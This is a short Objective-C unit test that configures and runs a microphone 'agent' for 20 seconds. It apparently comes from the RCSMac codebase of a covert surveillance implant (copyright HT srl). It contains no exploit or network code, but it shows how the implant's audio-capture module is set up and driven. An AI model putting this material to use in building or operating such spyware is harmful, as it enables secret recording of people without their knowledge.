/*
 *  RCSMAgentOrganizerTest.m
 *  RCSMac
 *
 *
 *  Created by revenge on 9/3/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>
#import <GHUnit/GHUnit.h>
#import <OCMock/OCMock.h>

#import "RCSMAgentMicrophone.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#define AGENT_MICROPHONE  0xC2C2


@interface RCSMAgentMicrophoneTest : GHTestCase

@end

@implementation RCSMAgentMicrophoneTest

- (BOOL)shouldRunOnMainThread
{
  // By default NO, but if you have a UI test or test dependent on running on the main thread return YES
  return NO;
}

- (void)setUpClass
{
  // Run at start of all tests in the class
}

- (void)tearDownClass
{
  // Run at end of all tests in the class
}

- (void)setUp
{
  // Run before each test method
}

- (void)tearDown
{
  // Run after each test method
}

- (void)testAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  //BOOL success              = YES;
  id mock                   = [OCMockObject partialMockForObject:
                               [RCSMAgentMicrophone sharedInstance]];
  
//  [[[[mock stub] andReturnValue: OCMOCK_VALUE(success)] andPost: notify] _logData: [OCMArg any]];

  //
  // Prepare the agent configuration
  //
  NSMutableDictionary *agentConfiguration = [NSMutableDictionary dictionaryWithCapacity: 6];
  
  NSNumber *tempID      = [NSNumber numberWithUnsignedInt: AGENT_MICROPHONE];
  NSString *agentState  = AGENT_ENABLED;
    
  NSMutableData *agentData = [[NSMutableData alloc] init];
  uint32_t elem = 0;
  // VAD
  [agentData appendBytes: &elem
                  length: sizeof(elem)];
  // Silence threshold
  [agentData appendBytes: &elem
                  length: sizeof(elem)];

  NSArray *keys = [NSArray arrayWithObjects: @"agentID",
                                             @"status",
                                             @"data",
                                             nil];
  
  NSArray *objects;
  
  objects = [NSArray arrayWithObjects: tempID,
                                       agentState,
                                       agentData,
                                       nil];
  
  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                         forKeys: keys];
  [agentConfiguration addEntriesFromDictionary: dictionary];
  [agentData release];
  
  [mock performSelector: @selector(setAgentConfiguration:)
             withObject: agentConfiguration];
  
  [NSThread detachNewThreadSelector: @selector(start)
                           toTarget: mock
                         withObject: nil];
  
  sleep(20);
  
  [mock performSelector: @selector(stop)];
  [outerPool release];
}

@end
